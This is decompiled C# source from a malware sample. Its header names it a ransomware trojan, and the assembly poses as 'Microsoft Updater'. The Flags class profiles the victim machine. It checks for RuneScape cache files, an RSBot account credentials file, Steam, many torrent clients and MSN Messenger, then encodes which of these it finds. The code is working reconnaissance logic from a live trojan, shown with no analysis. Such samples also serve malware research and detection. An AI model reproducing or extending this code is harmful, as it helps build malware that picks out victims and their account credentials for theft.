// Decompiled with JetBrains decompiler
// Type: Epidemic_HTTP.Flags
// Assembly: Microsoft Updater, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2E2B3032-0636-4B8C-A49B-30EA659CCFCC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00024-msil\Trojan-Ransom.Win32.Foreign.neod-4b5461e9b7975d274b77e2b28ee9fc7a71cf3294652993dfd23081524d2a783e.exe

using System;
using System.IO;

namespace Epidemic_HTTP
{
  internal class Flags
  {
    public static string mainDrive = Path.GetPathRoot(Environment.SystemDirectory);
    public static string homeDir = Environment.ExpandEnvironmentVariables("%HOMEDRIVE%%HOMEPATH%");

    public string getFlags()
    {
      try
      {
        return this.getRunescape() + this.getRSBot() + this.getSteam() + this.getTorrent() + this.getMSN();
      }
      catch (Exception ex)
      {
        Functions.ReportError(Functions.GetMethodName("{0}"), ex.Message, ex.StackTrace);
        return (string) null;
      }
    }

    private string getRunescape()
    {
      string runescape = "";
      string[] strArray = new string[4]
      {
        Flags.homeDir + "\\.jagex_cache_32",
        Flags.homeDir + "\\jagex_runescape_preferences.dat",
        Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)) + ".jagex_cache_32",
        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\RSBot_Accounts.ini"
      };
      for (int index = 0; index < strArray.Length; ++index)
      {
        if (Directory.Exists(strArray[index]) || File.Exists(strArray[index]))
        {
          runescape = "R";
          break;
        }
      }
      return runescape;
    }

    private string getRSBot()
    {
      string rsBot = "";
      string[] strArray = new string[1]
      {
        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\RSBot_Accounts.ini"
      };
      for (int index = 0; index < strArray.Length; ++index)
      {
        if (Directory.Exists(strArray[index]) || File.Exists(strArray[index]))
        {
          rsBot = "B";
          break;
        }
      }
      return rsBot;
    }

    private string getSteam()
    {
      string steam = "";
      string[] strArray = new string[2]
      {
        Flags.mainDrive + "Program Files (x86)\\Steam",
        Flags.mainDrive + "Program Files\\Steam"
      };
      for (int index = 0; index < strArray.Length; ++index)
      {
        if (Directory.Exists(strArray[index]) || File.Exists(strArray[index]))
        {
          steam = "S";
          break;
        }
      }
      return steam;
    }

    private string getTorrent()
    {
      string torrent = "";
      string[] strArray = new string[14]
      {
        Flags.mainDrive + "Program Files\\BitTorrent",
        Flags.mainDrive + "Program Files (x86)\\BitTorrent",
        Flags.mainDrive + "Program Files\\uTorrent",
        Flags.mainDrive + "Program Files (x86)\\uTorrent",
        Flags.mainDrive + "Program Files\\tixati",
        Flags.mainDrive + "Program Files (x86)\\tixati",
        Flags.mainDrive + "Program Files\\Bitcomet",
        Flags.mainDrive + "Program Files (x86)\\Bitcomet",
        Flags.mainDrive + "Program Files\\ABC",
        Flags.mainDrive + "Program Files (x86)\\ABC",
        Flags.mainDrive + "Program Files\\Deluge",
        Flags.mainDrive + "Program Files (x86)\\Deluge",
        Flags.mainDrive + "Program Files\\Vuze",
        Flags.mainDrive + "Program Files (x86)\\Vuze"
      };
      for (int index = 0; index < strArray.Length; ++index)
      {
        if (Directory.Exists(strArray[index]) || File.Exists(strArray[index]))
        {
          torrent = "T";
          break;
        }
      }
      return torrent;
    }

    private string getMSN()
    {
      string msn = "";
      string[] strArray = new string[2]
      {
        Flags.mainDrive + "Program Files (x86)\\Windows Live\\Messenger",
        Flags.mainDrive + "Program Files\\Windows Live\\Messenger"
      };
      for (int index = 0; index < strArray.Length; ++index)
      {
        if (Directory.Exists(strArray[index]) || File.Exists(strArray[index]))
        {
          msn = "M";
          break;
        }
      }
      return msn;
    }
  }
}
